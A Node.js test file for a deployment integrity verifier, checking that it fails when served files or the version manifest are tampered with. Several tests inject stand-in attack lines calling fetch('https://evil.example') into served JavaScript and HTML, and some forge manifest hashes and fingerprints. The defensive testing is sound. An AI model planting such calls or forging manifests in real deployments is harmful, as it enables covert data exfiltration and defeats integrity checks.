// The live verifier is the only thing standing between "a page responded" and
// "the served application is the artifact we built". It is therefore tested the
// same way as the other gates: it must FAIL on tampering, not merely pass clean.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const { spawnSync, spawn } = require('node:child_process');

const repoRoot = process.cwd();
const SHA = 'f'.repeat(40);

function buildArtifact() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tt-live-'));
  fs.cpSync(repoRoot, dir, {
    recursive: true,
    filter: (src) => !src.includes(`${path.sep}node_modules`) && !src.includes(`${path.sep}_site`)
  });
  const built = spawnSync(process.execPath, ['scripts/build-static-artifact.mjs'], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, THINK_TANK_SOURCE_SHA: SHA, THINK_TANK_RUNTIME_ENV: 'test-env' }
  });
  assert.equal(built.status, 0, `build failed: ${built.stderr}`);
  // The trusted source witness is separate from the HTTP-served artifact.
  // Mutating version.json can never mutate this baseline.
  fs.copyFileSync(path.join(dir, '_site/version.json'), path.join(dir, '.trusted-version.json'));
  return dir;
}

async function serve(rootDir) {
  const server = http.createServer((req, res) => {
    const rel = decodeURIComponent(req.url.split('?')[0]).replace(/^\/+/, '') || 'index.html';
    res.setHeader('Connection', 'close');
    const file = path.join(rootDir, '_site', rel);
    if (!file.startsWith(path.join(rootDir, '_site')) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) {
      res.writeHead(404).end('not found');
      return;
    }
    res.writeHead(200).end(fs.readFileSync(file));
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  // fetch keeps connections alive, and server.close() waits for them, which
  // hangs the test file forever. Force sockets shut as part of teardown.
  const stop = () => {
    server.closeAllConnections?.();
    server.close();
  };
  return { server, stop, base: `http://127.0.0.1:${server.address().port}` };
}

// MUST be async. The HTTP server under test lives in this process, so a
// spawnSync here blocks the event loop and the child waits forever for a
// response the parent cannot send -- a deadlock, not a slow test.
function verify(dir, base, env = {}) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, ['scripts/verify-live-runtime.mjs', base], {
      cwd: dir,
      env: { ...process.env, THINK_TANK_EXPECTED_SHA: SHA,
        THINK_TANK_TRUSTED_MANIFEST_FILE: path.join(dir, '.trusted-version.json'), ...env }
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('close', (status) => resolve({ status, stdout, stderr }));
  });
}

test('live verifier passes against an untampered deployment', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const result = await verify(dir, base);
    assert.equal(result.status, 0, `expected pass, got: ${result.stderr}`);
    assert.match(result.stdout, /Live runtime content VERIFIED against trusted GitHub source/);
    assert.match(result.stdout, /files re-hashed/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier fails when served JavaScript is tampered', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const target = path.join(dir, '_site/app/domain/deterministic-engine.js');
    fs.appendFileSync(target, "\nfetch('https://evil.example', { method: 'POST' });\n");
    const result = await verify(dir, base);
    assert.notEqual(result.status, 0, 'tampered served JS must fail');
    assert.match(result.stderr, /content mismatch/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier fails when served index.html is tampered', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const target = path.join(dir, '_site/index.html');
    fs.writeFileSync(target, `${fs.readFileSync(target, 'utf8')}\n<script>fetch('https://evil.example');</script>\n`);
    const result = await verify(dir, base);
    assert.notEqual(result.status, 0, 'tampered served HTML must fail');
    assert.match(result.stderr, /content mismatch/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier fails when the manifest is edited to match tampered content', async () => {
  // The attack the content hashes alone would not stop: tamper a file AND
  // rewrite its hash in version.json. The fingerprint check must catch it.
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const crypto = require('node:crypto');
    const target = path.join(dir, '_site/app/domain/deterministic-engine.js');
    fs.appendFileSync(target, "\nfetch('https://evil.example');\n");
    const manifestPath = path.join(dir, '_site/version.json');
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    manifest.artifactFileHashes['app/domain/deterministic-engine.js'] =
      `sha256:${crypto.createHash('sha256').update(fs.readFileSync(target)).digest('hex')}`;
    fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);

    const result = await verify(dir, base);
    assert.notEqual(result.status, 0, 'a self-consistent forgery must still fail the fingerprint check');
    assert.match(result.stderr, /fingerprint does not match its own fields/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier fails on a source SHA mismatch and on an environment mismatch', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const wrongSha = await verify(dir, base, { THINK_TANK_EXPECTED_SHA: 'a'.repeat(40) });
    assert.notEqual(wrongSha.status, 0);
    assert.match(wrongSha.stderr, /source SHA mismatch/i);

    const wrongEnv = await verify(dir, base, { THINK_TANK_EXPECTED_ENV: 'cloudflare-workers' });
    assert.notEqual(wrongEnv.status, 0);
    assert.match(wrongEnv.stderr, /environment mismatch/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier refuses a manifest with no artifactFileHashes', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const manifestPath = path.join(dir, '_site/version.json');
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    delete manifest.artifactFileHashes;
    fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    const result = await verify(dir, base);
    assert.notEqual(result.status, 0, 'a legacy manifest must not be accepted as verified');
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});


test('live verifier rejects forged files plus recomputed self-consistent manifest fingerprint', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const crypto = require('node:crypto');
    const target = path.join(dir, '_site/app/domain/deterministic-engine.js');
    fs.appendFileSync(target, '\n// unauthorized modification\n');
    const manifestPath = path.join(dir, '_site/version.json');
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    manifest.artifactFileHashes['app/domain/deterministic-engine.js'] =
      'sha256:' + crypto.createHash('sha256').update(fs.readFileSync(target)).digest('hex');
    // Make both the served file hashes AND manifest fingerprint self-consistent.
    const { builtAt, manifestFingerprint, ...core } = manifest;
    manifest.manifestFingerprint = 'sha256:' +
      crypto.createHash('sha256').update(JSON.stringify(core)).digest('hex');
    fs.writeFileSync(manifestPath, JSON.stringify(manifest) + '\n');
    const result = await verify(dir, base);
    assert.notEqual(result.status, 0, 'a forged, internally consistent manifest must fail against trusted source');
    assert.match(result.stderr, /hash differs from trusted GitHub source/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('live verifier fails closed without independent trusted manifest', async () => {
  const dir = buildArtifact();
  const { stop, base } = await serve(dir);
  try {
    const result = await verify(dir, base, { THINK_TANK_TRUSTED_MANIFEST_FILE: '' });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /Trusted locally rebuilt artifact manifest is required/);
  } finally {
    stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
